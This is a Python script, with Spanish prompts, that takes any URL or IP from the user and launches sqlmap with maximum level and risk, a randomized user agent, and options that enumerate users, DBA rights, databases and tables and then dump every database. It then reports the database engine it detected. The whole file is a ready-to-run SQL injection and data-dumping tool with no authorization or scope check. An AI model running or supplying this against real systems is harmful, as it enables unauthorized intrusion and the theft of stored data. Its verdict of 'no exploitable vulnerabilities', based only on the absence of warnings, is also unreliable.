import subprocess
import re

def print_relevant_line(line):
    """Prints relevant lines and summarizes key information."""
    include_patterns = [
        r"database", r"banner", r"current user", r"current db", r"is dba",
        r"available databases", r"available tables", r"column name", r"entry",
        r"dumping", r"starting", r"data", r"WARNING", r"ERROR"
    ]

    ignore_patterns = [
        r"INFO", r"legal disclaimer"
    ]

    # Check if the line matches any include pattern
    for pattern in include_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            print(line, end='')
            return

    # Check if the line matches any ignore pattern
    for pattern in ignore_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            return
    
    print(line, end='')

url = input("Inserte la URL o IP que quiere escanear: ")
print("\nHemos iniciado el proceso de SQL injection...\n")

# Define the sqlmap command
command = [
    "sqlmap", "-u", url, "--batch", "--random-agent",
    "--level=5", "--risk=3", "--banner", "--current-user",
    "--current-db", "--is-dba", "--dbs", "--tables",
    "--dump-all", "--threads=5"
]

process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# Initialize flags and counters
db_detected = False
warnings = []
errors = []
for line in process.stdout:
    print_relevant_line(line)
    
    if not db_detected:
        if re.search(r"Oracle", line, re.IGNORECASE):
            print("\nHemos detectado una base de datos Oracle")
            db_detected = True
        elif re.search(r"MySQL", line, re.IGNORECASE):
            print("\nHemos detectado una base de datos MySQL")
            db_detected = True
        elif re.search(r"PostgreSQL", line, re.IGNORECASE):
            print("\nHemos detectado una base de datos PostgreSQL")
            db_detected = True
        elif re.search(r"Microsoft SQL Server", line, re.IGNORECASE):
            print("\nHemos detectado una base de datos Microsoft SQL Server")
            db_detected = True

    if re.search(r"\[WARNING\]", line):
        warnings.append(line.strip())
    if re.search(r"\[ERROR\]", line):
        errors.append(line.strip())

# Capture and print any error output
stderr_output = process.stderr.read()
if stderr_output:
    print("Error:", stderr_output)

# Close the process streams and wait for completion
process.stdout.close()
process.stderr.close()
process.wait()

# Summary of findings
if warnings:
    print("\n=== Advertencias Encontradas ===")
    for warning in warnings:
        print(warning)

if errors:
    print("\n=== Errores Encontrados ===")
    for error in errors:
        print(error)

if not warnings and not errors:
    print("\nNo se encontraron vulnerabilidades explotables en el escaneo realizado.")



